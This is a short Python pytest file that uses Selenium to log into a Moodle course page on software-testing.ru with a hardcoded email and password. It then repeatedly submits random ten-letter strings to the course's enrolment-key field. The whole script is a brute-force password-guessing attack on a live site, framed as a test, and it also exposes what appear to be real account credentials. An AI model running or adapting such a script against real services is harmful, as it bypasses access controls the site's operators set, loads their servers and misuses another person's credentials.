__author__ = 'NovikovII'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import pytest
from selenium import webdriver
import string
import random

@pytest.fixture
def driver(request):
    wd = webdriver.Chrome()
    request.addfinalizer(wd.quit)
    return wd


def test_mobile(driver):
    list_pwd = []

    driver.get("http://software-testing.ru/lms/enrol/index.php?id=534")
    driver.find_element_by_name("username").send_keys("assassinen@ya.ru")
    driver.find_element_by_name("password").send_keys("ii484801")
    driver.find_element_by_id("loginbtn").click()


    while len(list_pwd) < 141167095653376:
        try:
            driver.find_element_by_name("enrolpassword").clear()
        except:
            print(pwd)
        #driver.find_element_by_name("enrolpasswordunmask").click()
        pwd = "".join([random.choice(string.ascii_lowercase) for i in range(10)])
        if pwd not in list_pwd:
            list_pwd.append(pwd)

        driver.find_element_by_name("enrolpassword").send_keys(pwd)
        #driver.find_element_by_name("enrolpasswordunmask").click()
        driver.find_element_by_name("submitbutton").click()



